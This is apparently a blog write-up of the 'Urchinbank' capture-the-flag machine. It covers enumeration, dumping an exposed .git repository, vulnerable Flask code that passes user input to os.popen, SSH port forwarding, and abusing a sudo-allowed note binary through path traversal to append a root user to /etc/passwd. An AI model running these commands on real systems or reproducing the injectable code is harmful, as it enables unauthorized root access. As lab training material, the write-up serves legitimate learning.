---
layout: post
title: "Urchinbank"
date: 2022-03-05
categories: [ctf,machine-hard]
image: /assets/img/log2_urchinsec.png
---
## Urchinbank Machine Writeup 
UrchinSec CTF MMXXII was organized by <a href="https://twitter.com/urchinsec_" target="_blank" rel="noopener">urchinsec</a> under <a href="https://twitter.com/tahaafarooq" target="_blank" rel="noopener">tahaafarooq</a>,<a href="https://twitter.com/trustie_rity" target="_blank" rel="noopener">trustie_rity</a>,<a href="https://twitter.com/nicl4ssic" target="_blank" rel="noopener">nicl4ssic</a>,<a href="https://twitter.com/0xlilith666" target="_blank" rel="noopener">0xlilith666c</a>,<a href="https://twitter.com/tzanonima" target="_blank" rel="noopener">tzanonima</a>
with prices of The XSS Rat Full House Bundle Course by <a href="https://twitter.com/theXSSrat" target="_blank" rel="noopener">theXSSrat</a>
and HackTheBox VIP Month Subscription

i avoided to be an organizer so i could play on this CTF after finishing a UE 

Other writeups apart from machine

[web_writeup](https://peterchain7.github.io/urchin/) by <a href="https://twitter.com/peterChain7" target="_blank" rel="noopener">peterchain</a>

[another_writeup](https://hackmd.io/@malwarepeter/r1-7i7f-q) by <a href="https://twitter.com/MalwarePeter" target="_blank" rel="noopener">MalwarePeter</a>

Well I <a href="https://twitter.com/blackninja233" target="_blank" rel="noopener">blackninja23</a> was only one who succeful root Urchinbank Machine from  <a href="https://ctf.urchinsec.org/" target="_blank" rel="noopener">urchinsec</a>. i decided to write a writeup about this good machine

Two flags were needed, one for user and other one for root

<img src='/assets/img/log_urchinsec.png' alt='user'>

<img src='/assets/img/log2_urchinsec.png' alt='root'>


# Enumeration
From given desctiption, it say we shall just give you the server's IP , the domain shall be urchinbank.com
Add it to /etc/hosts
```sudo echo "207.154.231.229 urchinbank.com" >>/etc/hosts```
Starting off with a nmap scan:
```nmap -sC -sV urchinbank.com```
```
Nmap scan report for urchinbank.com (207.154.231.229)
Host is up (0.22s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:7d:16:eb:9a:06:96:85:73:56:07:68:b5:50:44:50 (RSA)
|   256 50:5c:5f:76:65:20:1a:01:75:07:9a:1b:da:06:ad:d2 (ECDSA)
|_  256 54:48:5c:ed:0b:4d:d6:83:21:a4:8d:be:ed:be:ca:d8 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Urchin Bank &#8211; Just another WordPress site
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.9.1
|_http-favicon: Unknown favicon MD5: A346545E38D60D97ECB98DE10C3CC715
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    Werkzeug httpd 2.0.3 (Python 3.8.10)
|_http-server-header: Werkzeug/2.0.3 Python/3.8.10
|_http-title: 404 Not Found
```
Discovering 4 ports at urchinbank.com which are 22,80,3306 and 8080
At first time, i decided to open port 80 after see a opensource called wordpress site from nmap result above
Opening port 80...
<img src='/assets/img/wordpress_host_discovery.png' alt='Web page discovering host'>

and we are given subdomain for this website. As seen from above
```Note : For our ibanking users , visit http://ibank.urchinbank.com/ ```
Add this to /etc/hosts.
You can performing some basics enum for wordpress but so far nothing.
Since this is wordpress,you can use wpscan and press-enum from <a href="https://twitter.com/KMchatta" target="_blank" rel="noopener">KMchatta</a> .You can read all about this tool from this link <a href="https://www.h4k-it.com/press-enum-wordpress-hacking-tool/" target="_blank" rel="noopener">press-enum</a>

# ibank enumeration
So we have ibank.urchinbank.com, opening it and having a message about Under development.
Well then bruteforce web page but so far nothing interest

# vhost enumeration
decided to bruteforce for vhost of urchinbank.com like we have ibank
Vhost in my gobuster seems react strange so i will use new feature fuzz in gobuster

<img src='/assets/img/vhost_enum_urchinbank.png' alt='gobuster vhost discovering'>
Discovering another vhost api.urchinbank.com

# api enumeration
Opening it

<img src='/assets/img/api_web_page.png' alt='api web page'>

We got a message that it is testing at port 8080.Remember that port 8080 from nmap??🤔🤔🤔

bruteforce api....

<img src='/assets/img/api_gobuster_urchinbank.png' alt='api gobuster bruteforce'>
Discovering .git directory which is used for development.From online it say that the .git folder contains all information that is necessary for the project and all information relating commits, remote repository address, etc. It also contains a log that stores the commit history. This log can help you to roll back to the desired version of the code.

Let me dump it, you can use wget or <a href="https://github.com/internetwache/GitTools" target="_blank" rel="noopener">Gittools-repo</a> but i will use Gittools-repo
```
git clone https://github.com/internetwache/GitTools #git clone Gittoolsrepo
cd GitTools 
cd Dumper
mkdir dump_git #make directory for the dump
cd dump_git
bash ../gitdumper.sh http://api.urchinbank.com/.git/ . #dump .git to dump_git directory
mkdir dump_files
bash ../../Extractor/extractor.sh ../dump_git/ ../dump_git/dump_files
```

<img src='/assets/img/extract_files_from_.git_urchinsec.png' alt='extract git files'>
From those command, you will have files and .git directory ready to be read
You can check .git by git but i will check those file that are extracted from .git using <a href="https://github.com/internetwache/GitTools" target="_blank" rel="noopener">Gittools-repo</a> 

# Source code review
From extracted, found 2 app.py which mean that it was edited interesting🙂🙂🙂
Analyze 2 of them, 
first, found that real_pin and real_acc were edited to '' from 9313 and 0112003414459
```  
def post(self):
        real_pin = '9313'  # set the pin of account here
        real_acc = '0112003414459'  # set the account to send here
```
second, found that interesting piece of code
```
class UploadFile(Resource):
    def post(self):
        try:
            parser = reqparse.RequestParser()
            parser.add_argument(
                'file', type=str, help='File Required to be downloaded')
            args = parser.parse_args()

            _fileLink = args['file']
            if _fileLink != "":
                cmd = str(_fileLink)
                msg = os.popen(f'{cmd}').read()

            return {'StatusCode': 200, 'Message': str(msg)}
```
this piece of code leading to command injection🥲🥲🥲🥲.
I can assure it was not easier to spot it at first
let me show it how i test that piece of code and see if it bring to command injection

<img src='/assets/img/proof_of_concept_urchinsec.png' alt='proof of concept'>

Getting shell then we start privesc

# Priviledge escalation
Finally we got user.txt

<img src='/assets/img/fred.rick_urchinsec.png' alt='got user'>
You can use basic knowledge or Automated tools like <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank" rel="noopener">linpeas-repo</a> but i will give short descripion

Enumerate network ports

<img src='/assets/img/network_urchinsec.png' alt='network privsec'>
Discovering port 8000 with localhost then we need to do ssh portfowarding with this command

```ssh -L 8000:127.0.0.1:8000 fred.rick@207.154.231.229 -i id_rsa```

Going to http://127.0.0.1:8000/ in our machine, found interesting web page in which maybe an attacker put payload inside to another user.

<img src='/assets/img/127.0.0.1:8000_urchinsec.png' alt='another user'>

You put command and execute as jamie.hyle
Getting shell then we start privesc maybe to root or user again

# Priviledge escalation
Performing sudo -l....
```
jamie.hyle@urchinbank:~$ sudo -l
Matching Defaults entries for jamie.hyle on urchinbank:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jamie.hyle may run the following commands on urchinbank:
    (ALL : NOPASSWD) NOPASSWD: /usr/bin/notepin
```
Searching it online but no luck. Well decided to do some observation to binary notepin.
let us run it first
```
jamie.hyle@urchinbank:~$ sudo /usr/bin/notepin
NOTE PIN v1.3.5
[1] Write Note
[2] Read Note
[3] Quit

>>
```
Well then we can overwrite something.then i will overwrite /etc/passwd 
Create your password 
```
openssl passwd -1 <YOURPASSWORD>
```
then edit /etc/passwd
```
jamie.hyle@urchinbank:~$ sudo /usr/bin/notepin
NOTE PIN v1.3.5
[1] Write Note
[2] Read Note
[3] Quit

>>
1

Enter File Name To Save Note To : 
../../etc/passwd

Enter Data To Write Into File : 
hacker:<YOURHASHPASSWORD>:0:0:root:/root:/bin/bash
Done
jamie.hyle@urchinbank:~$
```
login as hacker and you are root

having root.txt

Game done

































